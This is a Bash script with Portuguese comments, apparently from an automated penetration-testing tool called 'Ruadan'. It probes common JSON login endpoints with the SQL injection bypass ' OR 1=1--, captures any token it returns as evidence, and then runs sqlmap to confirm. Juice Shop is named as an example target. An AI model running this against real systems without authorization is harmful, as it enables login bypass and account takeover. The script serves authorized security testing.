#!/bin/bash
# ==============================================================================
# Ruadan - Probe de SQLi em endpoints de autenticação (login) com sqlmap
# ==============================================================================
# Uso: sqlmap_login_probe.sh <target> <port> <scheme>
#
# O QUE FAZ (por endpoint de login existente no alvo):
#   1. Probe rápido via curl: baseline (credencial inválida) vs bypass clássico
#      (' OR 1=1--) — se o bypass retorna 200 onde a baseline retorna 401/400,
#      a SQLi é CONFIRMADA NA HORA e o token/cookie de resposta é registrado
#      como evidência (linha SQLI_LOGIN_BYPASS_CONFIRMED — parseável pelo
#      findings do Ruadan, promovendo evidence_level da kill chain).
#   2. Confirmação detalhada via sqlmap (parâmetro marcado com '*'), apenas no
#      endpoint que respondeu — evita minutos de sqlmap contra URLs mortas.
#
# Por que não o "sqlmap --crawl" genérico: o crawl nunca encontra logins POST
# com corpo JSON (ex: Juice Shop /rest/user/login) — "no usable links found".
# ==============================================================================
set -u

TARGET="${1:?uso: sqlmap_login_probe.sh <target> <port> <scheme>}"
PORT="${2:-80}"
SCHEME="${3:-http}"
CURL_OPTS="-sk --max-time 15"

resolve_url() {
    local base="${SCHEME}://${TARGET}:${PORT}"
    # Detecta redirect HTTP -> HTTPS (Juice Shop faz 301 para https://)
    if [ "$SCHEME" = "http" ]; then
        local redir
        redir=$(curl $CURL_OPTS -o /dev/null -w "%{redirect_url}" "${base}/" 2>/dev/null)
        if [ -n "$redir" ] && [[ "$redir" == https* ]]; then
            echo "[probe] ${base} redireciona para HTTPS — usando ${redir%/}" >&2
            echo "${redir%/}"
            return
        fi
    fi
    echo "$base"
}

BASE_URL="$(resolve_url)"
echo "[probe] Alvo: ${BASE_URL}"

probe_login() {
    # $1 = endpoint, $2 = data-JSON (com '*' no parâmetro a testar)
    local url="${BASE_URL}$1"
    local data="$2"
    local code_baseline code_bypass body_bypass

    # Existência do endpoint (qualquer resposta que não seja 404/501/502/503)
    local code_head
    code_head=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X POST "$url" -H "Content-Type: application/json" -d "$data" 2>/dev/null)
    case "$code_head" in
        404|501|502|503|000) return ;;
    esac

    # Baseline: credencial claramente inválida
    code_baseline=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X POST "$url" \
        -H "Content-Type: application/json" \
        -d '{"email":"probe-nonexistent-9917@ruadan.local","password":"probe-WRONG-9917"}' 2>/dev/null)

    # Bypass SQLi clássico no parâmetro de usuário
    body_bypass=$(curl $CURL_OPTS -X POST "$url" -H "Content-Type: application/json" \
        -d "{\"email\":\"' OR 1=1--\",\"password\":\"probe-WRONG-9917\"}" 2>/dev/null)
    code_bypass=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X POST "$url" -H "Content-Type: application/json" \
        -d "{\"email\":\"' OR 1=1--\",\"password\":\"probe-WRONG-9917\"}" 2>/dev/null)

    echo "[probe] $1 → baseline=${code_baseline} bypass=${code_bypass}"

    if [ "$code_bypass" = "200" ] && [ "$code_baseline" != "200" ]; then
        echo "SQLI_LOGIN_BYPASS_CONFIRMED: ${url} (baseline HTTP ${code_baseline} vs bypass HTTP ${code_bypass})"
        echo "[probe] EVIDÊNCIA (resposta do bypass, primeiros 300 bytes):"
        echo "$body_bypass" | head -c 300
        echo ""
        # Confirmação detalhada via sqlmap (o '*' marca o parâmetro injectável)
        echo "[probe] Confirmando via sqlmap (pode levar alguns minutos)..."
        timeout 600 sqlmap -u "$url" --method POST --data "$data" \
            -H "Content-Type: application/json" \
            --batch --level 2 --risk 1 --threads 5 --timeout 15 --retries 2 \
            --technique=BU --flush-session 2>&1 | grep -E "Parameter|Type:|Title:|Payload:|back-end|is vulnerable|not vulnerable" | head -20
        return
    fi

    # Se o bypass manual falhou, sqlmap de verificação apenas quando houver
    # diferença suspeita entre baseline e bypass (respostas iguais = endpoint
    # morto/catch-all — sqlmap nele só queima minutos do ciclo IA sem achar nada)
    if [ "$code_bypass" != "$code_baseline" ]; then
        echo "[probe] Bypass manual não confirmou (diff baseline/bypass: ${code_baseline}→${code_bypass}) — sqlmap rápido para dupla verificação..."
        timeout 240 sqlmap -u "$url" --method POST --data "$data" \
            -H "Content-Type: application/json" \
            --batch --level 1 --risk 1 --threads 5 --timeout 10 --retries 1 \
            --flush-session 2>&1 | grep -E "Parameter|Type:|Title:|Payload:|is vulnerable|not vulnerable" | head -12
    else
        echo "[probe] Endpoint $1 sem diferença baseline/bypass (${code_baseline}/${code_bypass}) — sqlmap de verificação pulado (economia de tempo)."
    fi
}

# Endpoints de login comuns (JSON), ordenados por prevalência.
# O '*' dentro do valor marca o parâmetro alvo do sqlmap.
probe_login "/rest/user/login"  '{"email":"*","password":"ruadan-probe"}'
probe_login "/api/login"        '{"username":"*","password":"ruadan-probe"}'
probe_login "/api/auth/login"   '{"email":"*","password":"ruadan-probe"}'
probe_login "/auth/login"       '{"email":"*","password":"ruadan-probe"}'

echo "[probe] Probe de SQLi em logins concluído."
exit 0
